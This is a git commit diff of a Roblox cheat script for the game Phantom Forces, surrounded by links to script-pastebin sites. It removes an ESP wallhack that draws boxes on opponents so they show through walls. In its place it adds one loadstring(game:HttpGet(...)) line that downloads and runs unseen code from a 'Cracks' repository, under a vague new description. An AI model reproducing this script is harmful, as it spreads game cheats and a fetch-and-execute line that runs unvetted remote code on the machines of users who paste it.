d06b922ceeea64b15481e3e06180a803347108fc
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-28 02:53:22 +0100

    commit zero

--- LINK GAME Script pastebin roblox Phantom Forces .lua
+++ LINK GAME Script pastebin roblox Phantom Forces .lua
@@ -1,46 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-local color = BrickColor.new(50,0,250)
-local transparency = .8
-
-
-local function _ESP(c)
-  repeat wait() until c.PrimaryPart ~= nil
-  for i,p in pairs(c:GetChildren()) do
-    if p.ClassName == "Part" or p.ClassName == "MeshPart" then
-      if p:FindFirstChild("shit") then p.shit:Destroy() end
-      local a = Instance.new("BoxHandleAdornment",p)
-      a.Name = "shit"
-      a.Size = p.Size
-      a.Color = color
-      a.Transparency = transparency
-      a.AlwaysOnTop = true    
-      a.Visible = true    
-      a.Adornee = p
-      a.ZIndex = true    
-
-    end
-  end
-end
-local function ESP()
-    for i,v in pairs(workspace.Players:GetChildren()) do
-        for j,k in pairs(v:GetChildren()) do
-           if k.ClassName == "Model" then
-               print('yes')
-               _ESP(k)
-            end
-        end
-        v.ChildAdded:Connect(function(instance)
-           _ESP(instance) 
-        end)
-    end
- end
-ESP()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RaptorsSexy/Cracks/main/NoirLikesDick.txt"))();
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							Script on ESP to view opponents through walls!
+							Script for a legit game or Vice versa
 						
 ]]
